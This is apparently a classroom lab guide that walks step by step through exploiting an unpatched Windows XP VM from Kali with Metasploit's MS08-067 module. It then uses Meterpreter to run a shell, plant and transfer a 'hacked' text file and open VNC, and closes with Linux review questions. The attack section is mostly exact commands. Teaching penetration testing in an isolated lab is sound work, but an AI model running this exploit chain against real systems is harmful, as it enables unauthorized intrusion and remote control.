**********************************************
Straightforward Training™
Using Metasploit/Meterpreter to Windows XP (Advance)
Author: Saulo S. Ortiz
Date: 20190908
Update: 20190909
**********************************************

DISCLAIMER
1. These steps are for educational purposes only and for use at your own
network laboratory. If you use these steps without consent from the network
owner, you’re on your own.

2. I am not responsible for any issues/damages to hardware or software by using
any of the software mentioned in this guide nor damages by following the
steps…do so at your own risk. I have tested these steps myself and found no
issues/damage to my own systems. Also I am not responsible for software links,
software availability or versions.

3. You will need to have common Linux knowledge to be able to follow this guide
as well as what an .iso file is; installing and configuring a Linux distro in a
VM environment, general VM knowledge, and basic DOS commands. I will not be
covering these steps in this short guide. This guide is NOT for people that
have no idea how to install, remove, update/upgrade, and configure Linux/Windows
OS or VMs. Google is your best friend and research is part of the job.

COMMONS COMMANDS TO KNOW:
•	ls		- Lists Files (LS)
•	pwd		- Prints the current path to screen
•	cd		- Call Directory
•	mkdir		- Make Directory
•	rm		- Deletes a folder and files in it (also rm –rf, or rmdir)
•	cat		- Prints the contents of a file to screen
•	ifconfig		- Displays local network information
•	echo		- Repeats a command to screen and assist in creating a file (Windows)
•	ren		- Rename a file or folder (Windows)

LEGEND:
•	Commands: 	Words in BOLD are commands
•	Comments: 	Words in italic red are comments…many have additional commands
•	Important: 	Words with asterisk lines are important notes
****************************************************

DEFAULT LOGINS:
•	Kali: root/toor

WHAT YOU’LL NEED FOR THIS EXERCISE:
•	A computer with minimum: 8GB RAM, 6 Core CPU and a HDD of 500GB
•	ISO file of Windows XP SP2 or SP3 without Windows Update MS08_067
•	ISO file of the latest Kali release
•	OracleVirtualbox (free) or VMWare Workstation 12 or higher

******************************************************************************
NOTE: When using a VM make sure you change your resolution to the highest you
can use without having any scroll bars on the sides or the bottom of the screen.
******************************************************************************

SETUP:
1. Install the VM application you want, then install Kali and Windows XP as VMs.
Give Kali 4GB RAM and 40GB HDD space. Give Windows 1GB RAM. And also 40GB of HDD
space.
2. Give Kali 1 processor and 2 Cores of CPU. Give XP 1 processor with 1 Core
CPU.
3. Maximize the GPU memory on both Kali (1GB) and XP (512MB). Do not use 3D on
any of them.
4. Make sure both network connectivity are in NAT so they use the same network
range. There is no need to be connected to the Internet for this to work.

ATTACK:
Run both Kali and XP VMs.

1.	In Kali scan for live-hosts…
a.	Type: nmap –Pn <target>/24
i.	Annotate your findings like IPs and their services running if any

2.	Run metasploit…
a.	Type: msfconsole
b.	Type: use exploit/windows/smb/ms08_067_netapi
i.	Have you used TAB to autocomplete a command?
c.	Type: set RHOST
i.	To the XP IP address
d.	Type: run
i.	Or exploit

******************************************************************************
NOTE: You’re in meterpreter, a command shell connecting you to your target.
******************************************************************************

1.	In meterpreter…
a.	Type: pwd

2.	Find information about the target…
a.	Type: sysinfo
i.	Take notes

3.	Find network information…
a.	Type: ipconfig

4.	Move back to the root directory
a.	Type: cd \\
i.	You can also use cd ..

5.	Verify…
a.	Type: ls
i.	Or dir (it also works)

6.	Create a folder…
a.	Type: mkdir whoops

7.	Rename the folder:
a.	Type: ren whoops gothacked

8.	Verify…
a.	Type: dir

9.	Go into the folder
a.	Type: cd gothacked

10.	Create a file with text in it…
a.	Type: execute –f cmd.exe –i –H
i.	Or shell
b.	Type:  echo “ this computer was hacked by me! “ > hacked.txt
c.	Type: exit

11.	Back in meterpreter verify the file is there…
a.	Type: ls
b.	Type: cat hacked.txt

12.	Download the text file…
a.	Type: download hacked.txt

13.	Background the session
a.	Type: background
i.	Take note of the ID number for this session

14.	Verify the file is in YOUR computer…
a.	Type: ls

15.	Open a new terminal and edit the file…
a.	Type: nano hacked.txt
b.	In a new line type: don’t forget to smile!
c.	Comment out the first line using a # sign before the comment
d.	Save it: Ctrl+S
e.	Ctrl+X to exit

16.	Find the correct session ID for this attack…
a.	Type: sessions
b.	Type: sessions –i <#>
i.	Replace the <#> with the correct number for the session

******************************************************************************
NOTE: You’re back in meterpreter!
******************************************************************************

17.	Upload the file back to the target…
a.	Type: upload hacked.txt

18.	Get a GUI of the target machine…
a.	Type: run vnc
i.	Wait a few seconds for this to work

ADDITIONAL STUFF
In Linux, folders and files are considered the same thing…files. Answer the following questions:
1.	What is a file or folder that begins with a period (.) in its name?
2.	How can you look for them?
3.	What is the command used to delete a folder that contains files/is not empty?
4.	What is the command (dir) in Windows? What is the equivalent in Linux?
5.	What is VNC?
6.	What is nano?
7.	What is the command to update/upgrade Linux with the latest fixes/patches?
8.	What is a BASH and how does a script begin?
9.	Can you write a small BASH script to update/upgrade?
10.	What is the command to use to make a BASH script executable?
